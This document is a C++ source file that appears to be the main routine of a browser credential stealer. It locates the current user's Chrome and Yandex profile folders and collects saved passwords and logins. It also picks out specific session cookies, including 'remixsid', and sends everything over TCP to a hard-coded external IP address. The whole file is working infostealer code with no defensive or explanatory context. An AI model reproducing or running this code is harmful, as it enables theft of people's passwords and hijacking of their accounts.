#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "Ws2_32.lib")

#include "Writer.h"
#include "TcpClient.h"
#include "LikeChromeGrabber.h"
#include <stdio.h>
#include <conio.h>
using namespace std;

int main() {
	wchar_t user_t[256];
	DWORD sizeOfUser = 256;
	GetUserName(user_t, &sizeOfUser);
	wchar_t path[1024] = {0};
	wcscat(path, L":\\Users\\");
	wcscat(path, user_t);
	wcscat(path, L"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\");
	LikeChromeGrabber chrome(path, user_t);

	memset(path, 0, sizeof(path));
	wcscat(path, L":\\Users\\");
	wcscat(path, user_t);
	wcscat(path, L"\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\");
	LikeChromeGrabber yandex(path, user_t);
	
	//wcout << re;
	vector <IGrabber::Profile> prChrome = chrome.grabPasswords(), prYandex = yandex.grabPasswords();
	vector <IGrabber::Cookie> ckChrome = chrome.grabCookies(), ckYandex = yandex.grabCookies();
	Writer out;
	out << prChrome.size() + 2 + prYandex.size();
	const wstring NAMES[] = {L"l", L"p", L"remixsid"}; 
	for (int i = 0; i < 3; ++i)
		for (int j = 0; j < ckChrome.size(); ++j)
			if (ckChrome[j].name == NAMES[i])
				out << ckChrome[j].value;

    for (int i = 0; i < 3; ++i)
		for (int j = 0; j < ckYandex.size(); ++j)
			if (ckYandex[j].name == NAMES[i])
				out << ckYandex[j].value;

	for (int i = 0; i < prChrome.size(); ++i)
		out << prChrome[i].url << prChrome[i].login << prChrome[i].pass;
	for (int i = 0; i < prYandex.size(); ++i)
		out << prYandex[i].url << prYandex[i].login << prYandex[i].pass;
	out.confirm();

	TcpClient client("188.120.238.32", "1224");
	if (!client.Start()) {
		printf("error connection to the server");
		_getche();
		exit(3);
	}
	client.Send(out.toCharPtr(), out.size());
	client.Stop();

	printf("Success!");
	_getch();
	return 0;
}